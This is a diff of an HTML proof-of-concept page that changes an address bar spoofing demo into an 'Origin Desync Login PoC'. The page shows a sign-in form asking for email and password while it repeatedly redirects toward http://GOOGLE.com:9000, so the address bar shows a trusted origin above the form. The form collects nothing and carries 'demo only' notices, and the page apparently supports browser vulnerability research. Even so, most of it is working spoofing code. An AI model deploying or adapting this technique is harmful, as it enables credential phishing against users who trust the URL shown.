@@ -1,43 +1,134 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Address Bar Spoofing PoC</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: sans-serif;
-      background-color: #fafafa;
-      cursor: pointer;
-      user-select: none;
-    }
-    h1 {
-      color: #333;
-      text-align: center;
-      max-width: 400px;
-      padding: 20px;
-    }
-  </style>
+<meta charset="utf-8">
+<title>Origin Desync Login PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+}
+
+button {
+  margin:40px;
+  font-size:18px;
+  padding:10px 18px;
+}
+
+#panel {
+  display:none;
+  max-width:420px;
+  margin:80px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
+
+label {
+  display:block;
+  font-size:14px;
+  margin-top:12px;
+}
+
+input {
+  width:100%;
+  padding:10px;
+  font-size:16px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  margin-top:6px;
+}
+
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+}
+
+.login {
+  margin-top:20px;
+  width:100%;
+  padding:12px;
+  font-size:16px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+}
+</style>
 </head>
+
 <body>
-  <h1>Click anywhere to simulate address bar spoofing.<br>Test on Android</h1>
 
-  <script>
-    document.addEventListener('click', async () => {
-      // Wait for 3 seconds before "spoofing" the address bar
-      setTimeout(() => {
-        // Simulate the spoof by changing the URL without reloading the page
-        window.location.replace("https://example.com");
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
 
-        // You could also use document.location, but location.replace() is preferred
-        // because it doesn't leave history behind, making it harder for users to
-        // navigate back to the original page.
-      }, 3000);
-    }, { once: true });
-  </script>
+<div id="panel">
+  <h2>Account Sign‑In</h2>
+  <div class="sub">Session verification required</div>
+
+  <label>Email</label>
+  <input type="email" placeholder="user@example.com">
+
+  <label>Password</label>
+  <input type="password" placeholder="••••••••">
+
+  <button class="login" onclick="demoOnly()">Sign in</button>
+
+  <div class="notice">
+    Demo only — inputs are editable, no data is collected.
+  </div>
+</div>
+
+<script>
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+
+function demoOnly() {
+  alert(
+    'THIS IS NOT REAL\n\n' +
+    'NOT GOOGLE.\n' +
+    'No data is collected or transmitted.'
+  );
+
+  // Reset input values immediately
+  document.querySelectorAll('#panel input').forEach(input => input.value = '');
+}
+
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+  
+  // Improved delay and timing to handle better in Android
+  setTimeout(() => {
+    location.href = 'http://GOOGLE.com:9000';  // Adjust this with your desired target URL
+  }, 500); // Increased delay to make sure timing works better on Android
+};
+
+// Trigger navigation AFTER tab restore (mimics desync)
+window.addEventListener('pageshow', () => {
+  setTimeout(() => {
+    location.href = 'http://GOOGLE.com:9000';  // Adjust URL as needed
+  }, 500); // Delay increased for Android compatibility
+});
+
+// Optional: Using visibilitychange event as a fallback for mobile browsers
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible') {
+    setTimeout(() => {
+      location.href = 'http://GOOGLE.com:9000';  // Adjust URL as needed
+    }, 500);  // Additional delay to improve navigation timing
+  }
+});
+</script>
+
 </body>
 </html>
